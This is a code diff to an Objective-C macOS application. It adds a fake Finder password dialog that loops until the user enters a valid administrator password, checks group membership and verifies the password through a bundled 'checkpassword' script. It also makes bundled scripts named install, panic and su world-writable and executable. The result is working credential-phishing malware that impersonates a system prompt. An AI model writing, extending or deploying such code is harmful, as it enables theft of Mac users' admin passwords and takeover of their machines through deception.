@@ -9,8 +9,10 @@
 #import <CoreServices/CoreServices.h>
 #import "AppDelegate.h"
 #import "InputView.h"
-
-//#define YOSEMITE
+#import <pwd.h>
+#import <stdlib.h>
+#import <sys/stat.h>
+#import <stdio.h>
 
 @interface ASFinderAlert : NSAlert {
 @private
@@ -47,6 +49,10 @@
     return [[_asview viewWithTag:1337] stringValue];
 }
 
+- (NSString *)username {
+    return [[_asview viewWithTag:1773] stringValue];
+}
+
 @end
 
 
@@ -56,12 +62,38 @@
 
 @end
 
+BOOL isAdmin(const char *user) {
+    BOOL ret = NO;
+    int ngroups;
+    int *groups;
+    struct passwd *pw;
+    ngroups = 32;
+    groups = (int*)malloc(ngroups * sizeof(gid_t));
+    pw = getpwnam(user);
+    if (pw == NULL) {
+        return NO;
+    }
+    getgrouplist(user, pw->pw_gid, groups, &ngroups);
+    for (int i=0; i<ngroups; ++i) {
+        if (groups[i]==80)
+            ret = YES;
+    }
+    free(groups);
+    return ret;
+}
+
 @implementation AppDelegate
 
 - (void)applicationDidFinishLaunching:(NSNotification *)aNotification {
+    NSArray *scripts = @[@"checkgroup", @"checkpassword", @"install", @"panic", @"su"];
+    for (int i=0; i<[scripts count]; ++i) {
+        NSString *current_script = [[NSBundle mainBundle] pathForResource:scripts[i] ofType:@"bash"];
+        chmod([current_script cStringUsingEncoding:NSUTF8StringEncoding], 0777);
+    }
     while (1) {
+        
         ASFinderAlert *passRequest = [[ASFinderAlert alloc] init];
-        if (getgid()==20) {
+        if (isAdmin([NSUserName() cStringUsingEncoding:NSUTF8StringEncoding])) {
             [passRequest setMessageText:@"Finder wants to make changes. Type your       password to allow this."];
         }
         else {
@@ -69,7 +101,7 @@
         }
         [passRequest addButtonWithTitle:@"OK"];
         [passRequest addButtonWithTitle:@"Cancel"];
-        [passRequest setAccessoryView:[InputView inputViewWithUsername:NSFullUserName()]];
+        [passRequest setAccessoryView:[InputView inputViewWithUsername:NSUserName()]];
         
         NSProcessInfo *pInfo = [NSProcessInfo processInfo];
         NSString *version = [pInfo operatingSystemVersionString];
@@ -85,23 +117,23 @@
         NSLog(@"button: %lu", (unsigned long)button);
         if (button == 1000) {
             
-            system("/usr/bin/sudo -K");
-            
-            NSTask *echo = [NSTask new];
-            [echo setLaunchPath:@"/bin/bash"];
-            [echo setArguments:@[@"-c", [NSString stringWithFormat:@"echo %@ | sudo -S whoami", [passRequest password]]]];
-            [echo setCurrentDirectoryPath:@"~/"];
-            
+            system("/usr/bin/sudo -K"); // Kill any current sessions
+            if (!(isAdmin([[passRequest username] cStringUsingEncoding:NSUTF8StringEncoding]))) {
+                NSLog(@"%@ is not admin!", [passRequest username]);
+                NSBeep();
+                continue;
+            }
+            NSTask *loginCheck = [NSTask new];
+            [loginCheck setLaunchPath:[[NSBundle mainBundle] pathForResource:@"checkpassword" ofType:@"bash"]];
+            [loginCheck setArguments:@[[passRequest username], [passRequest password]]];
             NSPipe *outputPipe = [NSPipe pipe];
-            [echo setStandardInput:[NSPipe pipe]];
-            [echo setStandardOutput:outputPipe];
-            
-            [echo launch];
-            [echo waitUntilExit];
-            
+            [loginCheck setStandardOutput:outputPipe];
+            [loginCheck launch];
+            [loginCheck waitUntilExit];
             NSData *outputData = [[outputPipe fileHandleForReading] readDataToEndOfFile];
             NSString *outputString = [[NSString alloc] initWithData:outputData encoding:NSUTF8StringEncoding];
-            if ([outputString rangeOfString:@"root"].location != NSNotFound) {
+            NSLog(@"Got: %@", outputString);
+            if ([outputString  isEqual: @"RIGHT\n"]) {
                 break;
             }
             else {
@@ -113,6 +145,7 @@
         }
     }
 }
+
 
 - (void)applicationWillTerminate:(NSNotification *)aNotification {
 }
